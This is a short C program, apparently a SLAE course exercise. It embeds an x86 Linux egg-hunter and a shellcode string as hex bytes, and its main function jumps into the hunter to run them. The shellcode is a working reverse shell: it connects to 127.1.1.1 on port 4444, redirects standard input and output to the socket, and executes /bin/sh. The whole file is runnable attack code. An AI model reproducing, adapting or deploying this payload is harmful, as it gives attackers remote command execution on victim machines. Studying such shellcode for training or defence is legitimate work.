//////////////////////////
//			//
// Author: Anubis	//
// SLAE			//
//			//
//////////////////////////

#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = "\x31\xdb\x31\xc9\x31\xd2\xbe\xde\xc0\xad\xde\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x32\x75\xee\x8d\x5a\x04\x39\x33\x75\xe7\x8d\x53\x04\xff\xe2";
unsigned char shellcode[] = "\xde\xc0\xad\xde\xde\xc0\xad\xde\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd\x80\x89\xc3\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

int main(void)
{
    printf("Egg hunter length: %d\n", strlen(egghunter));
    printf("Shellcode length: %d\n", strlen(shellcode));

    void (*s)() = (void *)egghunter;
    s();

    return 0;
}

